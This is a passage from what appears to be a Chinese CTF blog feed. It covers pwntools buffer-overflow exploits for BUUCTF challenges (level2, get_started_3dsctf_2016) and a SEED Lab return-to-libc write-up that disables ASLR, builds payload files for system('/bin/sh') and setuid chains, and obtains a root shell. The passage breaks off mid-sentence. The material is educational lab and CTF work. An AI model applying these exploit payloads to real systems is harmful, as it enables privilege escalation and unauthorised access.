class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006E6</span>                 <span class="hljs-keyword">push</span>    rbp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006E7</span>                 <span class="hljs-keyword">mov</span>     rbp, rsp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006</span>EA                 <span class="hljs-keyword">mov</span>     edi, offset command <span class="hljs-comment">; &quot;/bin/sh&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006</span>EF                 <span class="hljs-keyword">call</span>    _system<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006</span>F4                 <span class="hljs-keyword">mov</span>     eax, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006</span>F9                 <span class="hljs-keyword">pop</span>     rbp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006</span>FA                 retn<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006</span>FA <span class="hljs-comment">; &#125; // starts at 4006E6</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006</span>FA backdoor        endp<br></code></pre></td></tr></table></figure><p>氵</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>sh=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27644</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./level2&#x27;</span>)<br><br>sys_sh_addr= <span class="hljs-number">0x00000000004006EA</span><br><br>sh.recvuntil(<span class="hljs-string">&#x27;of your name:\n&#x27;</span>)<br>sh.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">100</span>))<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>+<span class="hljs-number">8</span>)+p64(sys_sh_addr)<br><br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"> <span class="hljs-string">~&gt;</span> <span class="hljs-string">pwn</span> <span class="hljs-string">checksec</span> <span class="hljs-string">./get_started_3dsctf_2016</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/philo/get_started_3dsctf_2016&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure><p>gets导致溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> v4[<span class="hljs-number">56</span>]; <span class="hljs-comment">// [esp+4h] [ebp-38h] BYREF</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Qual a palavrinha magica? &quot;</span>, v4[<span class="hljs-number">0</span>]);<br>  gets(v4);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是这个题有个大坑，就是main函数不是通过push ebp；mov ebp ,  esp 压栈的</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>08048A20 main            proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; DATA XREF: _start+17↑o</span><br><span class="hljs-symbol">.text:</span>08048A20<br><span class="hljs-symbol">.text:</span>08048A20 var_3C          = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">3Ch</span><br><span class="hljs-symbol">.text:</span>08048A20 var_38          = <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">38h</span><br><span class="hljs-symbol">.text:</span>08048A20 argc            = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span>  <span class="hljs-number">4</span><br><span class="hljs-symbol">.text:</span>08048A20 argv            = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span>  <span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span>08048A20 envp            = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span>  <span class="hljs-number">0Ch</span><br><span class="hljs-symbol">.text:</span>08048A20<br><span class="hljs-symbol">.text:</span>08048A20                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">3Ch</span><br><span class="hljs-symbol">.text:</span>08048A23                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>+<span class="hljs-number">3Ch</span>+var_3C], offset aQualAPalavrinh <span class="hljs-comment">; &quot;Qual a palavrinha magica? &quot;</span><br><span class="hljs-symbol">.text:</span>08048A2A                 <span class="hljs-keyword">call</span>    printf<br><span class="hljs-symbol">.text:</span>08048A2F                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">esp</span>+<span class="hljs-number">3Ch</span>+var_38]<br><span class="hljs-symbol">.text:</span>08048A33                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>+<span class="hljs-number">3Ch</span>+var_3C], <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>08048A36                 <span class="hljs-keyword">call</span>    gets<br><span class="hljs-symbol">.text:</span>08048A3B                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>08048A3D                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">3Ch</span><br><span class="hljs-symbol">.text:</span>08048A40                 <span class="hljs-keyword">retn</span><br><span class="hljs-symbol">.text:</span>08048A40 main            endp<br></code></pre></td></tr></table></figure><p>看最后两行就可以看出来，抬栈之后直接ret</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>08048A3D                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">3Ch</span><br><span class="hljs-symbol">.text:</span>08048A40                 <span class="hljs-keyword">retn</span><br></code></pre></td></tr></table></figure><p>shift+f12查字符串，跟进flag.txt的引用，发现直接open flag文件，然后putchar打印出所有字符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> __cdecl <span class="hljs-title">get_flag</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, <span class="hljs-keyword">int</span> a2)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// esi</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v3; <span class="hljs-comment">// al</span><br>  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v5; <span class="hljs-comment">// al</span><br><br>  <span class="hljs-keyword">if</span> ( a1 == <span class="hljs-number">814536271</span> &amp;&amp; a2 == <span class="hljs-number">425138641</span> )<br>  &#123;<br>    v2 = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;rt&quot;</span>);<br>    v3 = getc(v2);<br>    <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">255</span> )<br>    &#123;<br>      v4 = (<span class="hljs-keyword">char</span>)v3;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        <span class="hljs-built_in">putchar</span>(v4);<br>        v5 = getc(v2);<br>        v4 = (<span class="hljs-keyword">char</span>)v5;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v5 != <span class="hljs-number">255</span> );<br>    &#125;<br>    fclose(v2);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样的话就很简单了，先调用get_flag_addr函数，然后参数设置满足<code>a1 == 814536271 &amp;&amp; a2 == 425138641</code>，在调用完get_flag_addr之后，返回地址设置为exit_addr，这里如果设置为别的值，会报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>sh=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">26256</span>)<br><span class="hljs-comment">#sh=process(&#x27;./get_started_3dsctf_2016&#x27;)</span><br><span class="hljs-comment">#elf = ELF(&#x27;./get_started_3dsctf_2016&#x27;)</span><br><br>get_flag_addr= <span class="hljs-number">0x080489A0</span><br>exit_addr=<span class="hljs-number">0x804E6A0</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x38</span>)+p32(get_flag_addr)+p32(exit_addr)+p32(<span class="hljs-number">814536271</span>)+p32(<span class="hljs-number">425138641</span>)<br><br>sh.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-lab：Return to libc Attack Lab</title>
    <link href="/p/70d1fe8b/"/>
    <url>/p/70d1fe8b/</url>
    
    <content type="html"><![CDATA[<p>关于rop原理的一个讲述：</p><p><a href="https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#inspecting-the-stack">https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#inspecting-the-stack</a></p><h1 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h1><ul><li><p>使用-m32标志编译为32位的程序</p></li><li><p>关闭地址随机化：<code>sudo sysctl -w kernel.randomize_va_space=0</code></p></li><li><p>使用<code>-fno-stack-protected</code> 选项在编译期间禁用StackGuard保护，比如<code>gcc -m32 -fno-stack-protector example.c</code></p></li><li><p>程序(和共享库)的二进制映像必须声明它们是否需要可执行堆栈。通过在程序头中标记一个字段来决定这个正在运行的程序的堆栈成是可执行的/不可执行的。最近版本的Ubuntu默认程序堆栈是不可执行的，可以通过<code>-z execstack</code>选项来使得堆栈可执行</p></li><li><p>为了简化攻击难度，我们需要将/bin/sh指向/bin/zsh。在 Ubuntu 20.04中，/bin/sh 符号链接指向/bin/dash shell，此shell具有保护机制：如果dash是在 Set-UID 进程中执行的，那么它会立即将有效用户 ID 更改为实际用户 ID，也即是会放弃其特权。<code>sudo ln -sf /bin/zsh /bin/sh</code></p></li></ul><p>综上：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo sysctl -w kernel.randomize_va_space=0<br><br>sudo ln -sf /bin/zsh /bin/sh<br><br>gcc -m32  -fno-stack-protector -z noexecstack -o retlib retlib.c<br><br>sudo chown root retlib<br><br>sudo chmod 4755 retlib<br><br>touch badfile <br><br>./retlib<br></code></pre></td></tr></table></figure><h1 id="Task-1-Finding-out-the-Addresses-of-libc-Functions"><a href="#Task-1-Finding-out-the-Addresses-of-libc-Functions" class="headerlink" title="Task 1: Finding out the Addresses of libc Functions"></a>Task 1: Finding out the Addresses of libc Functions</h1><p>在 Linux 中，当一个程序运行时，libc 库将被加载到内存中。当内存地址随机化被关闭时，对于同一个程序，库总是加载在相同的内存地址中(对于不同的程序，libc 库的内存地址可能是不同的)。因此，我们可以使用 gdb 这样的调试工具轻松找到 system ()的地址</p><p>可以将gdb的批处理命令写在gdb_command.txt中，然后输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gdb -q -batch -x gdb_command.txt ./retlib<br></code></pre></td></tr></table></figure><p>gdb_command.txt：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">break</span> main<br>run<br>p system<br>p <span class="hljs-keyword">exit</span><br>quit<br></code></pre></td></tr></table></figure><p>system地址：0xf7e11420</p><p>exit地址：0xf7e03f80</p><h1 id="Task-2-Putting-the-shell-string-in-the-memory"><a href="#Task-2-Putting-the-shell-string-in-the-memory" class="headerlink" title="Task 2: Putting the shell string in the memory"></a>Task 2: Putting the shell string in the memory</h1><p>我们的目的是触发system()函数，且参数是<code>/bin/sh</code>，这样就可以得到shell。因此，我们必须先知道字符串<code>/bin/sh</code>的地址</p><p>可以使用环境变量的方式实现上述目标</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">export</span> MYSHELL=/bin/sh</span><br><span class="hljs-meta">$</span><span class="bash"> env | grep MYSHELL</span><br>MYSHELL=/bin/sh<br></code></pre></td></tr></table></figure><p>编写程序./prtenv打印出<code>/bin/sh</code>字符串所在地址，注意到文件名和retlib必须都是相同字符数目，不然地址可能不同</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">char</span>* shell = getenv(<span class="hljs-string">&quot;MYSHELL&quot;</span>);<br>    <span class="hljs-keyword">if</span> (shell)<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)shell);<br>&#125;<br></code></pre></td></tr></table></figure><p>得到字符串的地址为<code>ffffd45d</code></p><h1 id="Task-3-Launching-the-Attack"><a href="#Task-3-Launching-the-Attack" class="headerlink" title="Task 3: Launching the Attack"></a>Task 3: Launching the Attack</h1><p>这个任务主要矛盾是算出X Y Z的值，以及系统调用和字符串的地址</p><p>运行retlib得到buffer的地址和ebp的地址，并算出0xffae1858和0xffae1840的差值，为24</p><p>当然，也可以使用gdb调试得到ebp和buffer的差值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./retlib</span> <br>Address of input[] inside main():  0xffae1870<br>Input size: 300<br>Address of buffer[] inside bof():  0xffae1840<br>Frame Pointer value inside bof():  0xffae1858<br>Segmentation fault<br></code></pre></td></tr></table></figure><p>返回地址相对于buffer的位置是：偏移24+4=28，这里返回地址应该替换为system的地址</p><p>由于回收栈时候的leave ret操作，esp会被抬高4个字节，因此28+4+4是system函数的参数，也即是字符串的地址；28+4是system函数执行后需要执行的下一个函数，也即是exit函数</p><p>顺带提一下，栈回收时候的操作：</p><ul><li>mov %ebp，%esp 。将esp指向ebp所指，相当于回收栈分配的空间</li><li>pop ebp。恢复前栈指针，同时esp=esp+4，也即是指向返回地址。上面mov和pop语句可以用一个leave代替</li><li>ret指令相当于pop eip，因此esp=esp+4，也即是指向返回地址+4处。因此第一个参数是在return addr+8的位置</li><li>leave指令也即是mov %ebp，%esp + pop ebp</li></ul><p>要注意到push和pop指令都隐含着esp的改变</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs awk">--------------------------------------------------------------<br><br>`mov %ebp，%esp`<br><br>     high         ┌───────────┐<br>                  │           │<br>                  │   arg     │<br>                  ├───────────┤<br>                  │           │<br>                  │   <span class="hljs-keyword">exit</span>    │<br>                  ├───────────┤<br>                  │           │<br>                  │return addr│<br>                  │           │<br>                  ├───────────┤<br>esp  ebp  ───► <br>---------------------------------------------------------------<br><br>`pop ebp`<br><br><br>    ebp  ───►<br><br>                  ┌───────────┐<br>                  │           │<br>                  │   arg     │<br>                  ├───────────┤<br>                  │           │<br>                  │   <span class="hljs-keyword">exit</span>    │                  <br>                  ├───────────┤<br>                  │           │<br>    ebp  ───►     │return addr│<br>                  │           │<br>                  ├───────────┤<br><br>---------------------------------------------------------------<br>`ret` 也即是 `pop eip`<br>  <br>    ebp  ───►<br><br>                  ┌───────────┐<br>                  │           │<br>                  │   arg     │<br>                  ├───────────┤<br>                  │           │<br>    esp  ───►     │    <span class="hljs-keyword">exit</span>   │                  <br>                  ├───────────┤<br>                  │           │<br>    eip  ───►     │return addr│<br>                  │           │<br>                  ├───────────┤<br><br>          <br></code></pre></td></tr></table></figure><p>攻击代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Fill content with non-zero values</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0xaa</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>))<br><br>X = <span class="hljs-number">36</span> <br>sh_addr = <span class="hljs-number">0xffffd45d</span>            <span class="hljs-comment"># The address of &quot;/bin/sh&quot;</span><br>content[X:X+<span class="hljs-number">4</span>] = (sh_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>Y = <span class="hljs-number">28</span> <br>system_addr = <span class="hljs-number">0xf7e11420</span>        <span class="hljs-comment"># The address of system()</span><br>content[Y:Y+<span class="hljs-number">4</span>] = (system_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>Z = <span class="hljs-number">32</span><br>exit_addr = <span class="hljs-number">0xf7e03f80</span>  <span class="hljs-comment"># The address of exit()</span><br>content[Z:Z+<span class="hljs-number">4</span>] = (exit_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment"># Save content to a file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;badfile&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br><br></code></pre></td></tr></table></figure><p>运行得到root shell：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs inform7">$ ./retlib <br>Address <span class="hljs-keyword">of</span> input<span class="hljs-comment">[]</span> <span class="hljs-keyword">inside</span> main():  0xffffce00<br>Input size: 300<br>Address <span class="hljs-keyword">of</span> buffer<span class="hljs-comment">[]</span> <span class="hljs-keyword">inside</span> bof():  0xffffcdd0<br>Frame Pointer value <span class="hljs-keyword">inside</span> bof():  0xffffcde8<br># <br></code></pre></td></tr></table></figure><h1 id="Task-4-Defeat-Shell’s-countermeasure"><a href="#Task-4-Defeat-Shell’s-countermeasure" class="headerlink" title="Task 4: Defeat Shell’s countermeasure"></a>Task 4: Defeat Shell’s countermeasure</h1><p>回忆一下dash的防御机制：如果dash是在 Set-UID 进程中执行的，那么它会立即将有效用户 ID 更改为实际用户 ID，也即是会放弃其特权</p><p>之前我们手动将sh指向zsh，这个任务中我们需要通过<code>sudo ln -sf /bin/dash /bin/sh</code>将sh指向dash，之后攻破dash的防御机制</p><h2 id="一个失败的尝试"><a href="#一个失败的尝试" class="headerlink" title="一个失败的尝试"></a>一个失败的尝试</h2><p>对栈帧进行覆盖，下面顺序是从高地址到低地址的方向：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">/bin/sh字符串的地址，也即是system()函数的参数<br><span class="hljs-number">0</span>，也即是setuid函数的参数<br><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">()</span></span>的地址<br><span class="hljs-function"><span class="hljs-title">setuid</span><span class="hljs-params">()</span></span>的地址<br></code></pre></td></tr></table></figure><p>计算一下地址：</p><ul><li>setuid的地址：0xf7e98e30</li><li>system地址：0xf7e11420</li><li>/bin/sh字符串的地址：ffffd466</li></ul><p>写个py脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Fill content with non-zero values</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0xaa</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>))<br><br>A  = <span class="hljs-number">40</span><br>sh_addr =     <span class="hljs-number">0xffffd465</span>   <span class="hljs-comment"># The address of &quot;/bin/sh&quot;</span><br>content[A:A+<span class="hljs-number">4</span>] = (sh_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>B = <span class="hljs-number">36</span><br>zero_addr = <span class="hljs-number">0</span>        <span class="hljs-comment"># 0 </span><br>content[B:B+<span class="hljs-number">4</span>] = (zero_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>C = <span class="hljs-number">32</span><br>system_addr = <span class="hljs-number">0xf7e11420</span>  <span class="hljs-comment"># The address of system()</span><br>content[C:C+<span class="hljs-number">4</span>] = (system_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>D = <span class="hljs-number">28</span><br>setuid_addr = <span class="hljs-number">0xf7e98e30</span>  <span class="hljs-comment"># The address of setuid()</span><br>content[D:D+<span class="hljs-number">4</span>] = (setuid_addr).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment"># Save content to a file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;badfile&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></td></tr></table></figure><p>攻击失败了，因为bof中调用了strcpy函数，在复制过程中遇到上面代码中B=36处的0会导致截断，无法复制0后的/bin/bash，也即是system函数缺少参数</p><h2 id="一个成功的尝试"><a href="#一个成功的尝试" class="headerlink" title="一个成功的尝试"></a>一个成功的尝试</h2><p>存在这样一个机制：如果是/bin/sh -p，那么不会放弃特权，因此我们需要触发<code>int execv(const char *pathname, char *const 